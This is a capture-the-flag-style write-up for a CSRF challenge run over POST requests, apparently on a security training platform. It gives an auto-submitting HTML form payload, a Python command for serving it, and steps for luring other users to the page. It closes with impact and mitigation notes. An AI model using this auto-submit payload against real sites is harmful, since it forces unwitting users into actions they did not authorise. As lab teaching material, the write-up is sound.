# Cross Site Request Forgery Challenge Two

## Description
To complete this challenge, you must get your CSRF counter above 0. The request to increment your counter is:

`POST /user/csrfchallengetwo/plusplus`
With the following parameter: `userId=your_user_id`

Where your_user_id is your unique identifier. This challenge requires you to send a POST request, which is more complex than the previous GET request challenge.

## Solution
This challenge demonstrates a CSRF vulnerability with POST requests. We need to create an HTML page that automatically submits a form when visited, triggering the POST request to increment our counter.

⚠️ Don't forget you can't finish this challenge alone - other users must visit your page.

## Steps to Reproduce

### 1 Step
Generate your malicious HTML page with an auto-submitting form:

```html
<form name="malForm" action="https://<update-here-with-shepherd>/user/csrfchallengetwo/plusplus" method="POST">
    <input type="hidden" name="userId" value="<here-come-your-userId>" />
    <input type="submit"/>
</form>
<script> document.malForm.submit(); </script>
```

### 2 Step
Serve your file using a simple HTTP server. You can use Python's built-in server:

```bash
python3 -m http.server 8080
```

Make sure to run this command in the same directory as your HTML file.

### 3 Step
Post the URL to the forum. If your local server is running on port 8080, the URL would look like: `http://localhost:8080/sahinyes.html`

![](/writeups/assets/images/csrf/csrf-2-post-message.jpg)

## Exploit
When another user visits your page, the form will automatically submit, sending the POST request with your userId parameter to increment your CSRF counter.

## Impact
This vulnerability allows an attacker to perform state-changing actions on behalf of another user without their consent, which could lead to unauthorized modifications or data exposure.

## Mitigation
To prevent POST-based CSRF attacks:
- Implement anti-CSRF tokens in all forms and validate them server-side
- Use the SameSite cookie attribute to prevent cross-site request forgery
- Implement proper authentication checks for sensitive operations
- Consider using custom request headers that cannot be sent by default HTML forms

---

[← Previous](./csrf-1.md) | [Next →](./csrf-3.md)

